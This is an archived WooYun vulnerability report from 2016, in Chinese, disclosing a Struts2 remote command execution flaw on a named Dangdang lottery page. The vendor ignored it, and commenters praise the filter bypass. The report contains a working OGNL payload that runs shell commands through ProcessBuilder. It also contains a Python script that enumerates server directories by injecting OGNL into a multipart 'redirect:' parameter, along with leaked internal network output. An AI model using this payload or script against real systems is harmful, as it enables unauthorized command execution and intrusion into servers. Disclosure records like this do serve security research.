{"id": 88739, "wybug_id": "wooyun-2016-0227945", "wybug_title": "神器而已之当当某站Struts2命令执行漏洞(绕过过滤)                                      ", "wybug_corp": "当当网", "wybug_author": "路人甲", "wybug_date": "2016-07-11 13:13", "wybug_open_date": "2016-07-16 18:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "补丁不及时"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-07-11：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-07-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 神器在手，天下我有。 详细说明：  从TangScan提交插件赚取汤圆购买了另一个插件，扫到当当一个站点的Struts2命令执行：\n\n漏洞地址：http://caipiao.dangdang.com/cbportal/usercenter/hemai.htm此处应有防护或过滤，之前的Payload都不好使了。测试Payload:\n\n\n\n列目录：\n\n\n\n执行命令：\n\n\n\nifconfig的结果解码后：\neth0      Link encap:Ethernet  HWaddr 90:B1:1C:4C:A9:F2            inet addr:192.168.1.203  Bcast:192.168.1.255  Mask:255.255.255.0          inet6 addr: fe80::92b1:1cff:fe4c:a9f2/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:3425084210 errors:0 dropped:15 overruns:0 frame:4604          TX packets:2920393573 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:2642679068898 (2.4 TiB)  TX bytes:1537753012738 (1.3 TiB)          Interrupt:194 Memory:d91a0000-d91b0000 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:910780964 errors:0 dropped:0 overruns:0 frame:0          TX packets:910780964 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:484110986527 (450.8 GiB)  TX bytes:484110986527 (450.8 GiB)virbr0    Link encap:Ethernet  HWaddr 00:00:00:00:00:00            inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:26 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:0 (0.0 b)  TX bytes:4022 (3.9 KiB)\n证实漏洞存在，不再深入，执行命令的Payload附在下面：\n${\"~[\"+new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','ifconfig|base64 -w 0'}).start().getInputStream())).readLine()+\"]~\"}\n列目录脚本：\n#! /usr/bin/env python# -*- coding: utf-8 -*-import reimport base64import requests path = '/usr/local/bea/'#要读取的路径url = \"http://caipiao.dangdang.com/cbportal/usercenter/hemai.htm\"#漏洞URLdata = \"\"\"--289b3f46292c4eee95g3f64e37d6f4dc\\r\\nContent-Disposition: form-data; name=\"redirect:/${\"~[\"+new java.io.File(\"%s\").listFiles()[%s]+\"]~\"}\"\\r\\n\\r\\n10498\\r\\n--289b3f46292c4eee95g3f64e37d6f4dc--\"\"\"try:    headers = {                'Content-Type': 'multipart/form-data; boundary=289b3f46292c4eee95g3f64e37d6f4dc',                 'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.9) Gecko/2009042113 Ubuntu/9.04 (jaunty) Firefox/3.0.9'    }    for x in range(0, 400):        response = requests.post(url, data = data % (path, str(x)), headers=headers, timeout=5, verify=False, allow_redirects=False)        result = re.findall(r'~\\[(.*?)\\]~', response.content, re.S|re.I)        if len(result) !=0:            print(result[0])        else:            print(\"Result End.....\")            breakexcept Exception, e:    print(str(e))\n   漏洞证明：  列目录：\n\n\n\n执行命令：\n\n\n\n\n\n   修复方案：  升级   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-16 18:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-07-11 14:46 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个位置和绕过漂亮啊    \n     2016-07-11 14:47 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1667 漏洞数:245        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  的确精彩    \n     2016-07-11 14:50 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:289 漏洞数:64        | 新手上路。)\t\t \n  看不到。。。    \n     2016-07-11 15:15 |    \t\tJiuShao \t\t\t( 普通白帽子  |\t\t\t        Rank:524 漏洞数:111        | ╮(╯▽╰)╭锄禾日当午)\t\t \n  的确精彩    \n     2016-07-11 15:17 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:377 漏洞数:122        | The quiter you are,the more you're able ...)\t\t \n  精彩。    \n     2016-07-11 15:56 |    \t\t有妹子送上 \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:40        | 一只脚踩扁了紫罗兰，紫罗兰却把香味留在了...)\t\t \n  的确精彩    \n     2016-07-11 15:59 |    \t\t重瞳 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 我是重瞳)\t\t \n  可以的，这很黑客    \n     2016-07-11 17:20 |    \t\tHax0rs \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:19        | Hax0rs)\t\t \n  这个位置和绕过漂亮啊    \n     2016-07-11 19:24 |    \t\tYang \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:119        | 作为菜鸟，大米手机摔破了怎么办？)\t\t \n  @小川 说得好像你能看到样的    \n     2016-07-11 22:24 |    \t\t偷笑的猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:5        | 我在笑但你看不到)\t\t \n  关键在于绕过    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}